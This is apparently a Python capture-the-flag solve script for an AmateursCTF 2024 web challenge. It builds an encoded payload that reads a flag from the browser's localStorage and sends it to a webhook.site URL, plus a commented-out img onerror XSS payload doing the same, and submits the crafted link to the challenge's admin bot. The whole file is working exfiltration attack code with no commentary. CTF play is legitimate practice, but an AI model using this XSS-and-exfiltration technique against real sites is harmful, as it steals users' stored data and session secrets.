import requests, json, threading, os, base64, time
PORT = "2024"
token = json.loads(requests.post("https://webhook.site/token").text)['uuid']
print("https://webhook.site/#!/view/" + token)
webhook_url = "https://webhook.site/" + token
def local_server():
  os.system(f"(trap 'kill 0' SIGINT; python -m http.server {PORT} & whcli forward --token={token} --target=http://localhost:{PORT})")
threading.Thread(target=local_server).start()

# code = f"""
# print("<img/src='x'/onerror=\\"let x = localStorage.getItem('flag');new Image().src='{webhook_url}?c='+x\\">")
# """

code = f"""
from urllib.request import urlopen
print(urlopen("{webhook_url}/?" + jseval('localStorage.flag')).read())
"""

print(code)
time.sleep(10)
url = f"https://amateurs-ctf-2024-sculpture-challenge.pages.dev/?code={base64.b64encode(code.encode()).decode()}"
print(url)
print(requests.post(f"http://admin-bot.amt.rs/sculpture?url={url}", data = { 'url': url }))